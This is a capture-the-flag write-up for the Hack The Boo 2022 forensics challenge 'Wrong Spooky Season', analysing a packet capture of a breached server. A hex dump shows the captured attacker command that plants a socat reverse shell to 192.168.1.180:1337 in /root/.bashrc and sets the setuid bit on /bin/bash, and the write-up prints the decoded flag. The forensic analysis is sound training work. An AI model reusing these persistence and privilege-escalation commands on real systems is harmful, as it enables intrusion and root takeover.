# Hack The Boo 2022

## Wrong Spooky Season

> "I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong." Now there is an internal breach in the `Spooky Network` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.
>
>  Author: N/A
>
> [`forensics_wrong_spooky_season.zip`](forensics_wrong_spooky_season.zip)

Tags: _forensics_

## Preparation

The challenge is provided with a pcap file to inspect. Opening the pcap in Wireshark brings an interesting stream of actions one can follow. Pretty much on the end of the capture there is an interessting looking package

```
0000   08 00 27 22 46 4f e0 4f 43 f7 13 5e 08 00 45 00   ..'"FO.OC..^..E.
0010   00 df 0c 9b 40 00 40 06 a8 d3 c0 a8 01 b4 c0 a8   ....@.@.........
0020   01 a6 05 39 b1 68 a4 d6 7a e0 37 ea 8e 50 80 18   ...9.h..z.7..P..
0030   01 f6 85 7c 00 00 01 01 08 0a ba 49 2d f2 3f 9a   ...|.......I-.?.
0040   1d aa 65 63 68 6f 20 27 73 6f 63 61 74 20 54 43   ..echo 'socat TC
0050   50 3a 31 39 32 2e 31 36 38 2e 31 2e 31 38 30 3a   P:192.168.1.180:
0060   31 33 33 37 20 45 58 45 43 3a 73 68 27 20 3e 20   1337 EXEC:sh' > 
0070   2f 72 6f 6f 74 2f 2e 62 61 73 68 72 63 20 26 26   /root/.bashrc &&
0080   20 65 63 68 6f 20 22 3d 3d 67 43 39 46 53 49 35    echo "==gC9FSI5
0090   74 47 4d 77 41 33 63 66 52 6a 64 30 6f 32 58 7a   tGMwA3cfRjd0o2Xz
00a0   30 47 4e 6a 4e 6a 59 66 52 33 63 31 70 32 58 6e   0GNjNjYfR3c1p2Xn
00b0   35 57 4d 79 42 58 4e 66 52 6a 64 30 6f 32 65 43   5WMyBXNfRjd0o2eC
00c0   52 46 53 22 20 7c 20 72 65 76 20 3e 20 2f 64 65   RFS" | rev > /de
00d0   76 2f 6e 75 6c 6c 20 26 26 20 63 68 6d 6f 64 20   v/null && chmod 
00e0   2b 73 20 2f 62 69 6e 2f 62 61 73 68 0a            +s /bin/bash.
```

Some Base64 encoded string. This looks like something which should be looked at:

```bash
$ echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d                               
HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```
